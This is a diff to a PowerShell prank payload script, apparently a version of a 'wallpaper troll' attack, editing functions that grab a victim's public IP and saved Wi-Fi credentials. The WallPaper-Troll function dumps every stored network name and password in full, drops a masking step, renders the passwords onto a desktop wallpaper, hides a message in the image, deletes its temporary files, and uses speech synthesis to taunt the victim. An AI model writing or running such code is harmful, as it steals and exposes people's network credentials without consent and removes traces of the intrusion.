@@ -105,7 +105,7 @@ function Get-PubIP {
         
         # Split the IP address by the period (.) and select the first two octets
         $ipParts = $computerPubIP.Split('.')
-        $firstTwoOctets = "$($ipParts[0]).$($ipParts[1])"
+        $firstTwoOctets = "$($ipParts[0]).$($ipParts[1]).$($ipParts[2])"
     }
 
     # If no Public IP is detected function will return $null to avoid sapi speak
@@ -333,49 +333,34 @@ public class Params
 #############################################################################################################################################
 Function WallPaper-Troll {
 
-    if (!$Networks) { 
-        Write-Host "variable is null" 
-    } else { 
-
+    if (!$Networks) { Write-Host "variable is null" 
+    }else { 
+    
         # This is the name of the file the networks and passwords are saved 
-
+    
         $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_WiFi-PWD.txt"
-
-        # Format the network names and passwords
-        $formattedNetworks = $Networks | ForEach-Object {
-            $networkName = $_.NetworkName
-            $password = $_.Password
-
-            # Format the password: first 5 characters, then stars, and then the last character
-            if ($password.Length -gt 6) {
-                $formattedPassword = $password.Substring(0, 5) + ('*' * ($password.Length - 6)) + $password[-1]
-            } else {
-                # If the password is 6 characters or less, just return it as is
-                $formattedPassword = $password
-            }
-
-            "$networkName : $formattedPassword"
-        }
-
-        # Save formatted networks and passwords to file
-        $formattedNetworks | Out-File -FilePath "$Env:temp\$FileName"
-
+    
+        ($Networks| Out-String) >> $Env:temp\$FileName
+    
         $content = [IO.File]::ReadAllText("$Env:temp\$FileName")
-
-        # This is the message that will be coded into the image you use as the wallpaper
-        $hiddenMessage = "`n`nMuhammed Emadeddin Sends his best regards, cares for you and your security, Keep yourself safe ....... with Love. CyberX"
-
-        # This will be the name of the image you use as the wallpaper
+    
+    
+    # this is the message that will be coded into the image you use as the wallpaper
+    
+        $hiddenMessage = "`n`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back `n with love -Jakoby"
+    
+    # this will be the name of the image you use as the wallpaper
+    
         $ImageName = "dont-be-suspicious"
-
-        <#
-
-        .NOTES  
-            This will take the information gathered and format it into a .jpg
-        #>
-
+    
+    <#
+    
+    .NOTES  
+        This will get take the information gathered and format it into a .jpg
+    #>
+    
         Add-Type -AssemblyName System.Drawing
-
+    
         $filename = "$env:tmp\foo.jpg" 
         $bmp = new-object System.Drawing.Bitmap $w,$h 
         $font = new-object System.Drawing.Font Consolas,18 
@@ -386,42 +371,42 @@ Function WallPaper-Troll {
         $graphics.DrawString($content,$font,$brushFg,500,100) 
         $graphics.Dispose() 
         $bmp.Save($filename) 
-
-        # Invoke-Item $filename 
-
-        <#
-
-        .NOTES 
-            This will take your hidden message and use steganography to hide it in the image you use as the wallpaper 
-            Then it will clean up the files you don't want to leave behind
-        #>
-
+    
+    # Invoke-Item $filename 
+    
+    <#
+    
+    .NOTES 
+        This will take your hidden message and use steganography to hide it in the image you use as the wallpaper 
+        Then it will clean up the files you don't want to leave behind
+    #>
+    
         echo $hiddenMessage > $Env:temp\foo.txt
         cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"
-
+    
         rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
-
-        #############################################################################################################################################
-
-        # This will open up notepad with all their saved networks and passwords and taunt them
-
+    
+    
+    #############################################################################################################################################
+    
+    
+    # This will open up notepad with all their saved networks and passwords and taunt them
+    
+    
         $s.Speak("wanna see something really cool?")
         Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
-        $s.Speak("Look at all your other passwords I got..")
+        $s.Speak("Look at all your other passswords I got..")
         Start-Sleep -Seconds 1
-        $s.Speak("These are the Wi-Fi passwords for every network you've ever connected to!")
+        $s.Speak("These are the wifi passwords for every network you've ever connected to!")
         Start-Sleep -Seconds 1
-        $s.Speak("I could send them to myself but I won't")
-        Start-Sleep -Seconds 1
-        $s.Speak("أو ممكن اعمل كده مش عارف")
-
+        $s.Speak("I could send them to myself but i wont")
+    
     }
-
+    
     # echo statement used to track progress while debugging
     echo "All Wifi Passes Done"
-}
-
-
+    }
+    
 ###########################################################################################################
 
 <#
